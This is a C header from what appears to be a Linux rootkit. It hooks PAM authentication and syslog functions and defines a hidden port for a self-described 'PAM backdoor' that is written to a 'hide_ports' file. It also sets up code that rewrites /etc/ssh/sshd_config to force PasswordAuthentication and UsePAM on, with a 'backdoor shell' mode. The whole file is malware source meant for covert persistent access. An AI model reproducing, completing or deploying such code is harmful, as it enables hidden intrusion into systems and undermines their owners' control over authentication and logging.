#ifndef __PAM_H
#define __PAM_H
#include "pam/pam_private.h"

int pam_authenticate(pam_handle_t *pamh, int flags);
int pam_open_session(pam_handle_t *pamh, int flags);
int pam_acct_mgmt(pam_handle_t *pamh, int flags);
#include "pam/pam_hooks.c"

void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...);
void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_list args);
#include "pam/pam_syslog.c"

/* this is literally only here so that we can write
 * a hidden port to the hide_ports file, and the
 * user knows which port is and isn't for the PAM
 * backdoor. */
#define PAM_PORT ??PAM_PORT?? // [USE_PAM_BD]

#ifdef PATCH_SSHD_CONFIG

/* is the size of /etc/ssh/sshd_config's contents
 * is larger than this number, only allocate memory
 * for up to this number. default limit is 8kb. comment out
 * to disable this & allocate the memory regardless of size.
 * not sure even this much is necessary tbh... */
#define MAX_SSHD_SIZE 1024 * 8

#define MAGIC_USR 1 // sshdpatch will print stuff out when called from backdoor shell..
#define REG_USR   2 // stays totally quiet otherwise.

static char *const patchtargets[2] = {"PasswordAuthentication",
                                      "UsePAM"};
static char *const antival[sizeofarr(patchtargets)]   = {"no",  // what we don't want.
                                                         "no"};
static char *const targetval[sizeofarr(patchtargets)] = {"yes", // what we do want.
                                                         "yes"};

/* stores /etc/ssh/sshd_config contents. */
static char *sshdcontents = NULL;

int sshdok(int res[], char **buf, size_t *sshdsize);
void sshdpatch(int mode);
#define SSHD_CONFIG "??SSHD_CONFIG??"
#include "sshdpatch/sshdchk.c"

#endif

#endif
